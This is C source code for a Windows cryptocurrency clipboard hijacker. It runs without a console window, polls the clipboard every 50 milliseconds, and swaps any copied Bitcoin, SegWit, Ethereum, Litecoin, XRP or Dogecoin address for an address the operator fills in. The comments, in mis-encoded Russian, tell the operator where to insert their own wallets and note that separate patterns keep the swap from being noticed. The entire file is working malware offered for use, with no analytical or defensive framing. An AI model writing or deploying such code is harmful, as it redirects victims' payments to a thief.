#include "re.h"
#include <windows.h>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

typedef struct crypto {
	char* ptn;
	char* address;
};

char* getclipboard()
{
	static HANDLE clip;
	if (OpenClipboard(NULL))
	{
		clip = GetClipboardData(CF_TEXT);
		CloseClipboard();
	}
	return (char*)clip;
}

void setclipboard(char* text)
{
	HGLOBAL global = GlobalAlloc(GMEM_FIXED, strlen(text) + 1);
	memcpy(global, text, strlen(text));
	if (OpenClipboard(NULL))
	{
		EmptyClipboard();
		SetClipboardData(CF_TEXT, global);
		CloseClipboard();
	}
}

int main() {
	// ñþäà âñòàâëÿòü ñâîè àäðåñà
	const char* btcadr = "";
	const char* segwitadr = "";
	const char* ethadr = "";
	const char* ltcadr = "";
	const char* xrpadr = "";
	const char* dogeadr = "";

	struct crypto btc = { .ptn = "^[13][a-km-zA-HJ-NP-Z1-9]*$",				.address = btcadr }; // ôèêñèðîâàííàÿ äëèíà íå ïîääåðæèâàåòñÿ â tiny regex
	struct crypto segwit = { .ptn = "^bc1q[a-zA-HJ-NP-Z0-9]*$",				.address = segwitadr }; // íà p2pkh è p2wpkh ðàçíûå ðåãóëÿðêè, òàê êàê èçìåíåíèå ëåãàñè àäðåñà íà ñåãâèò (bc1q) áóäåò çàìåòíî
	struct crypto eth = { .ptn = "^0x[a-fA-F0-9]*$",						.address = ethadr };
	struct crypto ltc = { .ptn = "^[LM3][a-km-zA-HJ-NP-Z1-9]*$",			.address = ltcadr };
	struct crypto xrp = { .ptn = "^r[0-9a-zA-Z]*$",							.address = xrpadr };
	struct crypto doge = { .ptn = "^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]*$",	.address = dogeadr };


	struct crypto all[6] = { btc, segwit, eth, ltc, xrp, doge }; // ãäå 6 - êîëè÷åñòâî ñåðâèñîâ
	
	while (1) {
		char* clipdata = getclipboard(); // ïîëó÷åíèå áóôåðà îáìåíà
		if (clipdata != NULL) { // åñëè â áóôåðå ÷òî-òî åñòü
			for (int i = 0; i < 6; i++) { // öèêë èç âñåõ òèïîâ êîøåëüêîâ, ãäå 6 - êîëè÷åñòâî ñåðâèñîâ
				int matchlen;
				int match = re_match(all[i].ptn, clipdata, &matchlen); // ïðîâåðêà, ÿâëÿåòñÿ ëè òåêñò â áóôåðå ñîîòâåòñòâóþùèì àäðåñîì
				if (match != -1) { // åñëè ÿâëÿåòñÿ, ïîäìåíà áóôåðà îáìåíà íà çàäàííûé â êîäå àäðåñ
					setclipboard(all[i].address);
				}
			}
		}
		Sleep(50); // ÷òîáû íå ãðóçèëî ïðîö, ïîñëå êàæäîé ïðîâåðêè ñîí íà 0.05 ñåê
	}
}
